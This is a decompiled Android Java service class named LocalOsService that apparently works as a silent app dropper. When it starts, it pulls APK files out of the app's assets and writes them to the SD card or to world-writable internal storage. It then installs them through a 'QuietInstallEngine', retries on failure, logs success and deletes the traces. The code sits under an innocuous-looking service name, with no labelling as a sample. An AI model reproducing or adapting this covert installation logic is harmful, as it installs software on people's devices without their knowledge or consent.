package com.qc.access;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import com.qc.common.Funs;
import com.qc.common.QuietInstallEngine;
import com.qc.util.ShareProDBHelper;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;

@SuppressLint({"WorldReadableFiles"})
public class LocalOsService extends Service {
    /* access modifiers changed from: private */
    public Context context;

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onCreate() {
        this.context = getApplicationContext();
        super.onCreate();
    }

    public void onDestroy() {
        super.onDestroy();
    }

    @SuppressLint({"WorldWriteableFiles"})
    public void onStart(Intent intent, int startId) {
        Thread thread = new Thread() {
            public void run() {
                String[] files = Funs.getAssetsAPK(LocalOsService.this.context, "apk");
                String installState = "False";
                if (files != null && files.length > 0) {
                    boolean sdCardExist = Environment.getExternalStorageState().equals("mounted");
                    for (int i = 0; i < files.length; i++) {
                        byte[] buffer = Funs.getByteFromAssets(LocalOsService.this.context, "apk", files[i]);
                        if (sdCardExist) {
                            try {
                                File sdCardFile = Funs.getSDCardFile("mnkp", files[i]);
                                Funs.writeByteFile(new FileOutputStream(sdCardFile), buffer);
                                String fileName = Environment.getExternalStorageDirectory() + "/mnkp/" + files[i];
                                installState = QuietInstallEngine.install(fileName);
                                if (!installState.contains("Success")) {
                                    QuietInstallEngine.installInSDCard(2);
                                    installState = QuietInstallEngine.install(fileName);
                                    QuietInstallEngine.installInSDCard(0);
                                }
                                if (installState.contains("Success")) {
                                    ShareProDBHelper.write(LocalOsService.this.context, "dataCenter", "isinstall", Boolean.valueOf(true));
                                }
                                sdCardFile.delete();
                            } catch (IOException e) {
                            }
                        } else {
                            try {
                                OutputStream out = LocalOsService.this.context.openFileOutput(files[i], 3);
                                out.write(buffer);
                                out.flush();
                                out.close();
                                try {
                                    QuietInstallEngine.ec("chmod 666 /data/data/" + LocalOsService.this.context.getPackageName() + "/files/" + files[i]);
                                } catch (InterruptedException e2) {
                                }
                                if (QuietInstallEngine.install("data/data/" + LocalOsService.this.context.getPackageName() + "/files/" + files[i]).contains("Success")) {
                                    ShareProDBHelper.write(LocalOsService.this.context, "dataCenter", "isinstall", Boolean.valueOf(true));
                                }
                                LocalOsService.this.context.deleteFile(files[i]);
                            } catch (FileNotFoundException | IOException e3) {
                            }
                        }
                    }
                    LocalOsService.this.stopSelf();
                }
                super.run();
            }
        };
        thread.setPriority(10);
        thread.start();
        super.onStart(intent, startId);
    }
}
